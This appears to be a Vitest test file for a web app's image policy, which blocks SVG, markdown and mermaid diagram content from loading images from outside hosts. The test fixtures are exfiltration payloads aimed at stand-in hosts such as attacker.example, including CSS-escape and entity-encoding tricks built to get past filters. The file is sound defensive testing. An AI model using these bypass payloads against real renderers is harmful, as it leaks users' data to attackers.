/**
 * Copyright (c) 2026-present Plane Software, Inc. and contributors
 * SPDX-License-Identifier: AGPL-3.0-only
 * See the LICENSE file for details.
 */

// The one image rule every model-drawn surface shares (ADR-046's exfiltration shape, honored
// in the reader's browser): pure functions, pinned without a DOM.
import { describe, expect, it } from "vitest";
import { API_URL } from "~/lib/api/client";
import { imageAllowed, mermaidLoadsExternal, withoutExternalImages } from "./image-policy";

const API = new URL(API_URL).origin;

describe("imageAllowed", () => {
  it("lets the API's origin and relative paths load, never another host", () => {
    expect(imageAllowed(`${API}/v1/blobs/abc`)).toBe(true);
    expect(imageAllowed("images/x.png")).toBe(true);
    expect(imageAllowed("https://attacker.example/p.png?d=secret")).toBe(false);
    expect(imageAllowed("//attacker.example/p.png")).toBe(false);
  });
});

describe("mermaidLoadsExternal", () => {
  it("refuses a source that would fetch while it renders", () => {
    expect(
      mermaidLoadsExternal('flowchart LR\n  A@{ img: "https://attacker.example/p?d=x" }'),
    ).toBe(true);
    expect(
      mermaidLoadsExternal("flowchart LR\n  A[\"<img src='https://attacker.example/p'>\"]"),
    ).toBe(true);
    expect(mermaidLoadsExternal("flowchart LR\n  A[#60;img src=x#62;]")).toBe(true);
    expect(
      mermaidLoadsExternal("flowchart LR\n  style A fill:url(https://attacker.example/p)"),
    ).toBe(true);
    expect(
      mermaidLoadsExternal(
        '%%{init: {"themeCSS": "@import url(https://a.example)"}}%%\nflowchart LR\n  A',
      ),
    ).toBe(true);
  });

  it("refuses CSS that escapes its way to a fetch, since mermaid applies a diagram's styles while it renders", () => {
    // `u\rl(` and `\75 rl(` are both `url(` to a browser.
    expect(
      mermaidLoadsExternal(
        "stateDiagram-v2\n  classDef x mask-image:u\\rl(https://a.example/p)\n  [*] --> A",
      ),
    ).toBe(true);
    expect(
      mermaidLoadsExternal(
        "stateDiagram-v2\n  classDef x border-image:\\75 rl(https://a.example/p) 30",
      ),
    ).toBe(true);
    expect(mermaidLoadsExternal('flowchart LR\n  style A fill:src("https://a.example/p")')).toBe(
      true,
    );
  });

  it("lets an ordinary diagram render, links and colours included", () => {
    expect(
      mermaidLoadsExternal(
        'flowchart LR\n  A[Start] --> B{Ok?}\n  click A "https://example.com" _blank\n  style B fill:#fff;',
      ),
    ).toBe(false);
  });
});

describe("withoutExternalImages", () => {
  it("drops foreign image targets and keeps our own, fragments and inline data", () => {
    const svg =
      `<svg><image href="https://attacker.example/p.png"></image><image href="${API}/v1/blobs/a"></image>` +
      `<use xlink:href="#arrow"></use><image href="data:image/png;base64,AA"></image></svg>`;
    const out = withoutExternalImages(svg);
    expect(out).not.toContain("attacker.example");
    expect(out).toContain(`href="${API}/v1/blobs/a"`);
    expect(out).toContain('xlink:href="#arrow"');
    expect(out).toContain("data:image/png");
  });

  it("reads tags quote-aware, so a > inside a value smuggles nothing past it", () => {
    const out = withoutExternalImages(`<div><img alt="x>" src="https://attacker.example/p"></div>`);
    expect(out).not.toContain("attacker.example");
  });

  it("strips foreign CSS reaches: url(), @import, image-set and escaped CSS", () => {
    const out = withoutExternalImages(
      `<svg><style>.n{fill:url(#grad)} .m{background:url(https://a.example/p)}</style>` +
        `<style>@import url(https://a.example/x.css);</style>` +
        `<rect style="background:image-set(&quot;https://a.example/p&quot; 1x)"></rect>` +
        `<rect style="background:url(\\68ttps://a.example/p)"></rect></svg>`,
    );
    expect(out).not.toContain("a.example");
    expect(out).toContain("url(#grad)");
  });

  it("drops a presentation attribute that reaches out, keeps the ones that point inside", () => {
    const out = withoutExternalImages(
      `<svg><path marker-end="url(https://a.example/m.svg#x)"></path><path marker-end="url(#arrow)"></path></svg>`,
    );
    expect(out).not.toContain("a.example");
    expect(out).toContain('marker-end="url(#arrow)"');
  });

  it("fails closed on a tag it cannot read", () => {
    expect(withoutExternalImages(`<svg><img src=x =y "z"></svg>`)).toBeNull();
  });

  it("keeps a link's href: following it is the reader's click", () => {
    const out = withoutExternalImages(
      `<svg><a href="https://example.com/docs"><text>docs</text></a></svg>`,
    );
    expect(out).toContain('href="https://example.com/docs"');
  });

  it("refuses an entity-encoded target it cannot read", () => {
    const out = withoutExternalImages(
      `<svg><image href="&#104;ttps://attacker.example/p"></image></svg>`,
    );
    expect(out).not.toContain("attacker.example");
  });
});
